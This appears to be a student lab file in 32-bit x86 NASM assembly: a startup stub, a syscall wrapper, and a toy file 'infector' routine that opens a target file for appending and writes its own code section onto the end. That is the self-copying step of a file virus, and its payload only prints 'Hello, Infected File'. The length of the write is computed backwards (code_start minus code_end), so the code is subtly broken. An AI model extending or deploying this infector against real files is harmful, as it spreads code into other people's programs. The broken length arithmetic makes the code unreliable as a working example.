STDOUT EQU 1
EXIT EQU 1
READ EQU 3
WRITE EQU 4
OPEN EQU 5
CLOSE EQU 6

section .data
    msg db "Hello, Infected File", 0
    len equ $ - msg

section .text
global _start
global system_call
extern main
global infection
global infector
_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop
        
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller

code_start:
infection:
    ; cdecl
    push ebp
    mov ebp, esp
    
    ; print
    mov eax, WRITE
    mov ebx, STDOUT
    mov ecx, msg
    mov edx, len
    int 0x80

    ; cdecl
    mov esp, ebp
    pop ebp
    ret

infector:
    ; cdecl
    push ebp
    mov ebp, esp
    pushad
    
    ;open file
    mov eax, OPEN 
    mov ebx, [ebp+8]        ; get first argument - file name
    mov ecx, 0x441          ; O_APPEND | O_WRONLY
    mov edx, 0644o
    int 0x80
    
    ;check
    cmp eax, 0
    jl exit_error

    push eax ; save fd

    ;write
    mov ebx, eax
    mov eax, WRITE
    mov ecx, code_start
    mov edx, code_start - code_end
    int 0x80

    ;close
    mov eax, CLOSE
    pop ebx ; get fd
    int 0x80

    ; cdecl
    popad
    mov esp, ebp
    pop ebp
    ret
code_end:

exit_error:
    mov eax, EXIT
    mov ebx, 0x55
    int 0x80